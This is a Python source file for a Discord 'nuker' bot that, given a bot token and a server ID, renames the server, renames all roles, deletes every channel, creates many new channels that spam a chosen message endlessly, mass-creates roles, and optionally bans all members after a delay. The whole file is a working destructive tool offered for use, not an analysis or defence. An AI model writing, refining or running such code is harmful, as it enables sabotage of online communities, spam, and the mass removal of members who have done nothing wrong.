import asyncio
from pystyle import Write, Colors, Colorate
import logging
import random
import os
import discord
import json
import time
from discord.ext import commands


os.system('cls' if os.name == 'nt' else 'clear')

def cprint(text):
    print(Colorate.Horizontal(Colors.purple_to_blue, text, 1))

def ccprint(text, end='', flush=False):
    print("\r" + Colorate.Horizontal(Colors.purple_to_blue, text, 1), end=end, flush=flush)

logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('asyncio').setLevel(logging.CRITICAL)

bot_token = Write.Input("\nToken: ", Colors.purple_to_blue)

if bot_token is None:
    cprint("Error: Bot token not found in the 'config.json' file.")
    exit()

intents = discord.Intents.default()
intents.guilds = True
intents.messages = False

bot = discord.Client(intents=intents)

@bot.event
async def on_ready():
    cprint(f'Logged in as {bot.user.name} ({bot.user.id})')
    cprint(f'--')
    cprint('List of servers:')
    cprint('-------------------------')
    for guild in bot.guilds:
        cprint(f'{guild.name} (ID: {guild.id})')
    cprint('-------------------------')
    ccprint("""
 _        _______  _______ _________ _______  _______  _       
( (    /|(  ___  )(  ____ \ __   __/(  ____ )(  ___  )( \      
|  \  ( || (   ) || (    \/   ) (   | (    )|| (   ) || (      
|   \ | || (___) || (_____    | |   | (____)|| (___) || |      
| (\ \) ||  ___  |(_____  )   | |   |     __)|  ___  || |      
| | \   || (   ) |      ) |   | |   | (\ (   | (   ) || |      
| )  \  || )   ( |/\____) |   | |   | ) \ \__| )   ( || (____/ /
|/    )_)|/     \|\_______)   )_(   |/   \__/|/     \|(_______/

Nuker made by irisk\n
""", end='', flush=True)
    
    guild_id = Write.Input("\nGuild ID: ", Colors.purple_to_blue)
    selected_guild = discord.utils.get(bot.guilds, id=int(guild_id))
    
    if selected_guild:
        cprint(f"Selected server: {selected_guild.name} (ID: {selected_guild.id})")
        
        if selected_guild.text_channels:
            invite = await selected_guild.text_channels[0].create_invite()
           
            cprint(f"Invite link: {invite.url}")
        else:
            cprint("Unable to create invite: No text channels in the server.")
        
        num_channels = int(Write.Input("Amount of Channels: ", Colors.purple_to_blue))
        num_roles = int(Write.Input("Amount of Roles: ", Colors.purple_to_blue))
        message = Write.Input("Nuke Message: ", Colors.purple_to_blue)
        channel_names = Write.Input("Channel Names (Name1, Name2,...) : ", Colors.purple_to_blue)
        role_names = Write.Input("Role Names (Name1, Name2,...) : ", Colors.purple_to_blue)
        ban_all = Write.Input("Ban all members? (y/n): ", Colors.purple_to_blue).lower()
        ban_reason = Write.Input("Ban Reason: ", Colors.purple_to_blue)
        wait_count_till_ban_wave = int(Write.Input("Wait time (in seconds) till ban wave: ", Colors.purple_to_blue))

        names = channel_names.split(",")
        names = [word.strip() for word in names if word.strip()]
        
        role_names_list = role_names.split(",")
        role_names_list = [word.strip() for word in role_names_list if word.strip()]

        newserver = Write.Input("Server Name: ", Colors.purple_to_blue)
        
        await selected_guild.edit(name=newserver)
        
        role_rename_task = [asyncio.create_task(role.edit(name=random.choice(role_names_list))) for role in selected_guild.roles]

        channel_deletion_tasks = [asyncio.create_task(channel.delete()) for channel in selected_guild.channels]
        
        async def create_channel_and_send_message(name):
            new_channel = await selected_guild.create_text_channel(name)
            cprint(f"Channel ID: {new_channel.id} created!")
            
            while True:
                await new_channel.send(message)
                await asyncio.sleep(1)
        
        async def create_role(name):
            new_role = await selected_guild.create_role(name=name)
            cprint(f"Role ID: {new_role.id} created!")

            while True:
                await asyncio.sleep(1)

        async def ban_member(member):
                try:
                    await member.ban(reason=ban_reason)
                    cprint(f"Banned {member.name}#{member.discriminator}")   
                except discord.Forbidden:
                    cprint(f"Insufficient permissions to ban {member.name}#{member.discriminator}")
                except Exception as e:
                    cprint(f"Failed to ban {member.name}#{member.discriminator}: {e}")

        creation_tasks = [asyncio.create_task(create_channel_and_send_message(random.choice(names))) for _ in range(num_channels)]
        role_creation_tasks = [asyncio.create_task(create_role(random.choice(role_names_list))) for _ in range(num_roles)]
       
        if ban_all == 'y':
            ban_tasks = []

            for member in selected_guild.members:
                if member != bot.user:
                    ban_tasks.append(asyncio.create_task(ban_member(member)))

            cprint(f"\nWaiting {wait_count_till_ban_wave} seconds before starting ban wave...", end='', flush=True)

            await asyncio.sleep(wait_count_till_ban_wave)

        await asyncio.gather(*creation_tasks, *channel_deletion_tasks, *role_creation_tasks, *role_rename_task, *ban_tasks)

        
    else:
        cprint("Error: Guild not found.")

bot.run(bot_token, log_handler=None)
